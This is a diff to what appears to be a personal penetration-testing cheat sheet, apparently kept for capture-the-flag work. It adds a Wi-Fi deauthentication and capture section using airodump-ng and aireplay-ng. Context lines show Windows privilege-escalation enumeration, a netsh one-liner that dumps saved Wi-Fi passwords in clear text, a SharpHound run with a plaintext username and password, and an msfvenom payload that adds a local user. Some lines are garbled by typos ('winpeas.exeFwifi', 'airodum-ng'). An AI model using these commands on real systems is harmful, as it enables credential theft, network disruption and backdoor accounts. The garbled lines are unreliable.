@@ -6,7 +6,7 @@ cmdkey /list
 whoami /all
 wmic logicaldisk get name
 get-process
-winpeas.exe
+winpeas.exeFwifi
 powerup.ps1 invoke-allchecks
 dir \ /s/b | find ""
 findstr /sp administrator *
@@ -166,6 +166,12 @@ export PATH=.:$PATH
   ```
   for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear | find "clave"
   ```
+## pcap2
+  ```
+  sudo airodum-ng -w file -c 3 --bssid 90:9A:4A:90:9A:4A wlan0
+  sudo aireplay-ng --deauth 0 -a 90:9A:4A:90:9A:4A wlan0
+  
+  ```
 ## bloodhound
   ```
   ./sharphound.exe -c all -d EGOTISTICAL-BANK.LOCAL --domaincontroller 10.10.10.175  --ldapusername fsmith --ldappassword Thestrokes23
@@ -266,4 +272,5 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
 
